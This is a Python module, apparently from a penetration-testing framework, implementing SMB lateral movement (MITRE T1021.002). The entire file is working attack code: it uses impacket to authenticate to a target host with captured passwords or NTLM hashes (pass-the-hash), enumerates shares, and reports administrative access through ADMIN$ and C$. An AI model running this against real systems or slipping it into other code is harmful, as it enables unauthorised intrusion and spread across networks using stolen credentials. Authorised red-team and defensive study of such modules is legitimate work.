"""
SMB lateral movement module.

MITRE T1021.002
Pivots to a target host via SMB using captured credentials or NTLM hashes.
"""

from __future__ import annotations

from aiptt.attacks.base import AbstractAttackModule, AttackResult


class Module(AbstractAttackModule):
    module_id       = "LAT-SMB-001"
    mitre_technique = "T1021.002"
    destructive     = False
    sandboxable     = True

    def execute(self, target: str, parameters: dict) -> AttackResult:
        domain   = parameters.get("domain", "")
        username = parameters.get("username", "")
        password = parameters.get("password", "")
        lm_hash  = parameters.get("lm_hash", "aad3b435b51404eeaad3b435b51404ee")
        nt_hash  = parameters.get("nt_hash", "")

        if not username:
            return AttackResult(False, "MISSING_PARAMS", False, "none",
                                "username is required")

        try:
            from impacket.smbconnection import SMBConnection  # type: ignore

            smb = SMBConnection(target, target, timeout=10)

            if nt_hash:
                smb.login(username, "", domain, lm_hash, nt_hash)
            else:
                smb.login(username, password, domain)

            shares = smb.listShares()
            admin_shares = [
                s["shi1_netname"][:-1]
                for s in shares
                if s["shi1_netname"][:-1].upper() in ("ADMIN$", "C$", "IPC$")
            ]
            smb.logoff()

            return AttackResult(
                success=True,
                outcome="SUCCESS",
                gained_access=True,
                access_level="local_admin" if admin_shares else "user",
                output=f"SMB pivot to {target} as {domain}\\{username}. "
                       f"Admin shares: {admin_shares}",
            )

        except ImportError:
            return AttackResult(False, "IMPACKET_MISSING", False, "none",
                                "impacket is not installed")
        except Exception as e:
            return AttackResult(False, "ERROR", False, "none", str(e))
